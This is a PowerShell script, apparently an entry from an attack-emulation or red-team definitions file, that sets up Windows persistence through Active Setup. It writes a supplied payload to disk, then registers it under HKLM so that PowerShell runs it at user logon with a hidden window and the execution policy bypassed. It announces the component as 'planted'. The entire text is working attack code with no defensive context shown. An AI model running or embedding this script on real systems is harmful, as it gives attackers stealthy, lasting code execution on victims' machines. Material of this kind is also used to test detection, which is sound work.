script:
if (-not $PAYLOAD_PATH) { throw 'PAYLOAD_PATH is required' }
$guid = if ($COMPONENT_GUID) { $COMPONENT_GUID } else { '{8E4F2A1C-3B7D-4A9E-9C2F-6D1B5A0E7C43}' }
$version = if ($VERSION) { $VERSION } else { '1,0,0,0' }
if ($PAYLOAD_BODY) {
    New-Item -ItemType Directory -Force -Path (Split-Path -Parent $PAYLOAD_PATH) | Out-Null
    Set-Content -LiteralPath $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii
}
$key = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$guid"
if (-not (Test-Path -LiteralPath $key)) { New-Item -Path $key -Force | Out-Null }
Set-ItemProperty -LiteralPath $key -Name 'StubPath' -Value ("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`"") -Type String -Force
Set-ItemProperty -LiteralPath $key -Name 'Version' -Value $version -Type String -Force
Set-ItemProperty -LiteralPath $key -Name 'IsInstalled' -Value 1 -Type DWord -Force
Write-Output "Active Setup component planted: $guid"
